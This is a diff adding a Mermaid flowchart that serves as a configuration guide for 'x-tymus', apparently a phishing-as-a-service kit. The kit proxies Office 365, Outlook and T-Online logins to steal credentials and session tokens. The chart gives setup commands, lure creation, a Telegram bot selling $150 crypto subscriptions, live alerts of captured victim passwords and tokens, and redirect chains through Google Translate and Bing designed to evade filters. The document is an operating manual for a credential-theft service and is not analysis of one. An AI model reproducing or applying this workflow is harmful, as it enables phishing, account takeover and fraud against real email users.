@@ -1,0 +1,187 @@
+---
+title: x-tymus — Full Configuration Guide
+---
+flowchart TD
+
+%% ══════════════════════════════════════════════
+%%  ADMIN SETUP
+%% ══════════════════════════════════════════════
+
+subgraph ADMIN_SETUP["🛠️  ADMIN SETUP (terminal + panel)"]
+  direction TB
+
+  A1["① Start x-tymus\n./x-tymus -p ./phishlets"]
+  A1 --> A2
+
+  A2["② Set server domain\nconfig domain yourdomain.com"]
+  A2 --> A3
+
+  A3["③ Set server IP\nconfig ip YOUR_SERVER_IP"]
+  A3 --> A4
+
+  A4["④ Set admin password\nconfig admin_password StrongPass123"]
+  A4 --> A5
+
+  A5["⑤ Configure Phishlets\n— Admin Panel → Phishlets tab —\n• Set hostname per phishlet\n  e.g. office.yourdomain.com\n• Set unauth_url (redirect for bots)\n• Click Enable"]
+  A5 --> A6
+
+  A6["⑥ Configure Telegram Bot\n— Admin Panel → Telegram Bot tab —\n• Bot Token  (from @BotFather)\n• Admin Chat ID  (from @userinfobot)\n• BTC / ETH / USDT wallet addresses\n• Price USD/month (default 150)\nClick Save  →  Restart x-tymus"]
+  A6 --> A7
+
+  A7["⑦ Verify\n[inf] telegram bot: running\n[inf] certdb: obtained cert for yourdomain.com"]
+end
+
+%% ══════════════════════════════════════════════
+%%  PHISHLET SETUP DETAIL
+%% ══════════════════════════════════════════════
+
+subgraph PHISHLET_SETUP["🎣  Phishlet Setup (per phishlet)"]
+  direction LR
+
+  P1["Phishlets tab\n→ find phishlet row"]
+  P1 --> P2["Set hostname\ne.g. login.yourdomain.com"]
+  P2 --> P3["Set unauth_url\ne.g. https://yourdomain.com"]
+  P3 --> P4["Click Enable\n→ cert auto-issued via Let's Encrypt"]
+  P4 --> P5["Lures tab\n→ Create Lure\n• choose phishlet\n• path auto-generated\n• set redirect URL (after capture)"]
+  P5 --> P6["Lures tab\n→ copy chain links\n• Google Translate (recommended)\n• Bing Translator\n• Direct chain"]
+end
+
+%% ══════════════════════════════════════════════
+%%  ADMIN PANEL TABS
+%% ══════════════════════════════════════════════
+
+subgraph PANEL["🖥️  Admin Panel  — /admin/panel"]
+  direction TB
+
+  TAB1["Overview\n• Recent sessions\n• Users at a glance"]
+  TAB2["Users\n• Create / delete users\n• Copy user panel URL"]
+  TAB3["Phishlets\n• Enable / disable\n• Set hostname\n• Set unauth URL\n• Quick create lure"]
+  TAB4["Lures & Chains\n• Create lure (form)\n• Delete lure\n• Generate chain links\n  (Google Translate / Bing / direct)\n• Assign to user"]
+  TAB5["Sessions\n• View all captures\n• Expand token JSON\n• Delete session"]
+  TAB6["Blacklist\n• Add IP / CIDR\n• Remove entry\n• View all blocked"]
+  TAB7["Telegram Bot\n• Edit bot config live\n• Approve / Reject pending subs\n• Delete subs\n• View all chain links per sub\n• Shows pending count badge"]
+end
+
+%% ══════════════════════════════════════════════
+%%  TERMINAL COMMANDS QUICK REF
+%% ══════════════════════════════════════════════
+
+subgraph TERMINAL["⌨️  Terminal Quick Reference"]
+  direction LR
+
+  T1["config domain DOMAIN\nconfig ip IP\nconfig admin_password PASS\nconfig redirect_url URL"]
+  T2["phishlets hostname SITE sub.domain.com\nphishlets enable SITE\nphishlets disable SITE"]
+  T3["lures create SITE\nlures edit ID\nlures get-url ID\nlures chain ID [depth]"]
+  T4["config bot_token TOKEN\nconfig bot_admin_chat_id ID\nconfig crypto_btc ADDR\nconfig crypto_eth ADDR\nconfig crypto_usdt ADDR\nconfig sub_price 150"]
+  T5["sessions\nsessions export ID\nsessions delete ID"]
+end
+
+%% ══════════════════════════════════════════════
+%%  USER FLOW  (Telegram Bot)
+%% ══════════════════════════════════════════════
+
+subgraph USER_FLOW["👤  USER FLOW (Telegram Bot)"]
+  direction TB
+
+  U1["User opens bot\n/start\n↓\nWelcome message + /help"]
+  U1 --> U2
+
+  U2["User picks service\n/buy\n↓\nInline keyboard appears:\n🏢 Office 365\n📧 T-Online Email\n📬 Outlook\n… etc."]
+  U2 --> U3
+
+  U3["User selects phishlet\n(taps button)"]
+  U3 --> U4
+
+  U4["Bot shows payment info\n/buy_info\n↓\nBTC / ETH / USDT wallets\nPrice: $150/month"]
+  U4 --> U5
+
+  U5["User sends payment\n/pay TX_HASH\n↓\nBot: ⏳ Payment submitted\nAdmin notified"]
+  U5 --> U6
+
+  U6{"Admin reviews\n(Telegram or\nAdmin Panel)"}
+  U6 -->|"✓ approve"| U7
+  U6 -->|"✗ reject"| U8
+
+  U7["User receives:\n🎉 Subscription active!\n📅 Expiry date\n🔗 Direct lure URL\n🌐 Google Translate link\n🌐 Bing Translator link\n📦 Direct chain link"]
+  U7 --> U9
+
+  U8["User notified: payment rejected\nAdmin can delete subscription"]
+
+  U9["User commands:\n/mylink   — see links again\n/status   — expiry date\n/logs     — view captured sessions\n/setnotify CHAT_ID — live alerts\n/notify_me — use own chat for alerts"]
+  U9 --> U10
+
+  U10{"Near expiry?"}
+  U10 -->|"Yes (bot notifies)"| U11
+  U10 -->|"No"| U9
+
+  U11["User renews:\n/renew\n↓\nChoose new phishlet (or keep same)\n↓\n/renew TX_HASH\n↓\nAdmin approves\n↓\n+30 days, new lure + chain"]
+end
+
+%% ══════════════════════════════════════════════
+%%  ADMIN TELEGRAM COMMANDS
+%% ══════════════════════════════════════════════
+
+subgraph ADMIN_TG["🤖  Admin Telegram Commands"]
+  direction LR
+
+  AT1["/stats\nActive subs / pending / sessions / tokens"]
+  AT2["/pending\nList payments waiting approval\n/approve ID  →  activates sub\n/reject  ID  →  deletes sub"]
+  AT3["/subs\nAll active subscriptions\n/delsub ID  →  delete"]
+  AT4["/sessions\nRecent captured sessions"]
+  AT5["/setprice 150\n/setbtc ADDR\n/seteth ADDR\n/setusdt ADDR\n/setphishlet NAME"]
+end
+
+%% ══════════════════════════════════════════════
+%%  SESSION NOTIFICATION FLOW
+%% ══════════════════════════════════════════════
+
+subgraph NOTIF["🔔  Live Session Notification"]
+  direction LR
+  N1["Victim visits lure URL"]
+  N1 --> N2["Credentials / tokens captured"]
+  N2 --> N3["x-tymus: NotifySession()"]
+  N3 --> N4["Bot sends alert to\nsubscriber's notify chat\n📧 New capture!\nUser: victim@email.com\nPass: ••••••••\n🍪 Tokens: captured"]
+end
+
+%% ══════════════════════════════════════════════
+%%  LINK CHAIN STRUCTURE
+%% ══════════════════════════════════════════════
+
+subgraph CHAIN["🔗  Redirect Chain (what user shares)"]
+  direction LR
+  C1["Share:\ntranslate.google.com/...\nor bing.com/translator?url=..."]
+  C1 --> C2["Hop 1 (AES token)\nAuto meta-refresh"]
+  C2 --> C3["Hop 2 (AES token)\nhistory.replaceState"]
+  C3 --> C4["Hop 3 (AES token)\ntop.location.replace"]
+  C4 --> C5["Final lure URL\nhttps://login.yourdomain.com/xxxxxxxx"]
+  C5 --> C6["Victim enters credentials\n→ MitM proxy captures\n→ session logged\n→ subscriber notified"]
+end
+
+%% ══════════════════════════════════════════════
+%%  CONNECTIONS
+%% ══════════════════════════════════════════════
+
+ADMIN_SETUP --> PHISHLET_SETUP
+ADMIN_SETUP --> PANEL
+ADMIN_SETUP --> TERMINAL
+PHISHLET_SETUP --> USER_FLOW
+ADMIN_TG -.->|"admin approves"| USER_FLOW
+USER_FLOW --> NOTIF
+USER_FLOW --> CHAIN
+
+%% ══════════════════════════════════════════════
+%%  STYLES
+%% ══════════════════════════════════════════════
+
+classDef setup    fill:#1a0a0a,stroke:#e05252,color:#e0a0a0
+classDef panel    fill:#0a0f1a,stroke:#52b0e0,color:#a0c8e0
+classDef user     fill:#0a1a0a,stroke:#4cd44c,color:#a0e0a0
+classDef admin    fill:#1a1000,stroke:#e0a040,color:#e0c080
+classDef chain    fill:#0f0f0f,stroke:#555,color:#aaa
+classDef notif    fill:#0a1010,stroke:#40c0c0,color:#80d0d0
+
+class ADMIN_SETUP,PHISHLET_SETUP setup
+class PANEL,TERMINAL panel
+class USER_FLOW,NOTIF user
+class ADMIN_TG admin
+class CHAIN chain
